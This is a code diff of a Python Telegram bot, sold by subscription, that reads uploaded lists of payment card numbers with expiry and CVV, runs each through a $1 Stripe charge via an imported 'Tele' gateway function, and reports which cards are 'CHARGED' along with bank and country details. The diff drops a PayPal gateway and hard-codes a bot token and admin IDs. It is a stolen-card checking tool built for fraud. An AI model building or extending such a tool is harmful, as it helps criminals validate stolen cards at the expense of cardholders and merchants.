@@ -1,23 +1,22 @@
 import telebot
+import time
 import requests
 from telebot import types
-import time
+from gatet import Tele
 import os
 import json
-from gatet2 import check_card
 
-# Bot setup
 token = '8153296702:AAFN1KOe_u3b2P4ZgWlsO6GfRsXUHx5uF64'
 bot = telebot.TeleBot(token, parse_mode="HTML")
 allowed_users = ['47987980465', '7579489523', '7749807563', '6099962760']
-admin_user_ids = ['your_admin_id']  # Replace with actual admin IDs
+admin_user_ids = ['7579489523', '7987980465']  # Replace with actual admin IDs
 
 @bot.message_handler(commands=["start"])
 def start(message):
     if str(message.chat.id) not in allowed_users:
         bot.reply_to(message, "🚫 You cannot use the bot. Contact developers to purchase a bot subscription.")
         return
-    bot.reply_to(message, "Available Gateways:\n/ch - Stripe Charge $1\n/pp - PayPal Charge $1\n/stop - Stop the current process\n\nSend /ch or /pp followed by the txt file to start checking.")
+    bot.reply_to(message, "Available Gateways:\n/ch - Stripe Charge $1\n/stop - Stop the current process\n\nSend /ch followed by the txt file to start checking.")
 
 @bot.message_handler(commands=["add"])
 def add_user(message):
@@ -40,14 +39,6 @@ def stripe_charge(message):
     bot.reply_to(message, "Send the txt file now for Stripe Charge $1")
     bot.register_next_step_handler(message, process_stripe_charge)
 
-@bot.message_handler(commands=["pp"])
-def paypal_charge(message):
-    if str(message.chat.id) not in allowed_users:
-        bot.reply_to(message, "🚫 You cannot use the bot. Contact developers to purchase a bot subscription.")
-        return
-    bot.reply_to(message, "Send the txt file now for PayPal Charge $1")
-    bot.register_next_step_handler(message, process_paypal_charge)
-
 @bot.message_handler(commands=["stop"])
 def stop_process(message):
     if str(message.chat.id) not in allowed_users:
@@ -58,17 +49,11 @@ def stop_process(message):
     bot.reply_to(message, "Successfully stopped 🛑")
 
 def process_stripe_charge(message):
-    process_charge(message, "Stripe")
-
-def process_paypal_charge(message):
-    process_charge(message, "PayPal")
-
-def process_charge(message, gateway):
     if not message.document:
         bot.reply_to(message, "Please send a valid txt file.")
         return
 
-    ko = bot.reply_to(message, f"Processing {gateway} Card Checking ...⌛").message_id
+    ko = bot.reply_to(message, "Processing Card Checking ...⌛").message_id
     file_info = bot.get_file(message.document.file_id)
     file_content = bot.download_file(file_info.file_path)
 
@@ -102,19 +87,31 @@ def process_charge(message, gateway):
 
                 start_time = time.time()
                 try:
-                    last = check_card(cc)
+                    result = Tele(cc)
+                    status = result.split(' - ')[1]
+                    if status == "CHARGED":
+                        bot.reply_to(message, f'''
+🔥 CHARGED 1$ !
+CC: <code>{cc.split('|')[0]}</code>
+Response: Thank You For Donation 🎉
+Info: {cc.split('|')[0][:6]} - {card_type} - {brand}
+Country: {country} {country_flag}
+Bank: {bank}
+Time: {"{:.1f}".format(time.time() - start_time)}s
+Bot By: <a href='t.me/BaignX'>BaignX</a>
+{checked_count + 1} / {total}''')
+                    else:
+                        bot.reply_to(message, f"{cc.strip()} - DECLINED ❌ - Your card was declined. - {result.split(' - ')[-1]}")
                 except Exception as e:
                     print(e)
-                    last = "Error processing card"
+                    bot.reply_to(message, f"{cc} - Error processing card - Unknown")
 
-                end_time = time.time()
-                execution_time = end_time - start_time
                 checked_count += 1
 
                 mes = types.InlineKeyboardMarkup(row_width=1)
                 mes.add(
-                    types.InlineKeyboardButton(f"• {cc} •", callback_data='u8'),
-                    types.InlineKeyboardButton(f"• STATUS : {last} ", callback_data='u8'),
+                    types.InlineKeyboardButton(f"• {cc.split('|')[0]} •", callback_data='u8'),
+                    types.InlineKeyboardButton(f"• STATUS : {status} ", callback_data='u8'),
                     types.InlineKeyboardButton(f"• TOTAL 🎉 : [ {total} ] •", callback_data='x'),
                     types.InlineKeyboardButton(f"[ STOP 🚫 ]", callback_data='stop')
                 )
@@ -123,23 +120,8 @@ def process_charge(message, gateway):
                     chat_id=message.chat.id,
                     message_id=ko,
                     text=f'''Wait for processing
-By ➜ <a href='t.me/BaignX'>BaignX</a> ''',
-                    reply_markup=mes
-                )
 
-                if "CHARGE ✅" in last:
-                    bot.reply_to(message, f'''
-🔥 CHARGED 1$ !
-CC: <code>{cc}</code>
-Response: Thank You For Donation 🎉
-Info: {cc[:6]} - {card_type} - {brand}
-Country: {country} {country_flag}
-Bank: {bank}
-Time: {"{:.1f}".format(execution_time)}s
-Bot By: <a href='t.me/BaignX'>BaignX</a>
-{checked_count} / {total}''')
-                else:
-                    bot.reply_to(message, f"❌ Declined. {checked_count} / {total}")
+By ➜ <a href='t.me/BaignX'>BaignX</a> ''', reply_markup=mes )
 
     except Exception as e:
         print(e)
@@ -150,7 +132,6 @@ Bot By: <a href='t.me/BaignX'>BaignX</a>
 def stop_callback(call):
     with open("stop.stop", "w") as file:
         pass
-    bot.answer_callback_query(callback_query_id=call.id, text="Process stopped!")
 
 def save_user_ids():
     with open("allowed_users.txt", "w") as file:
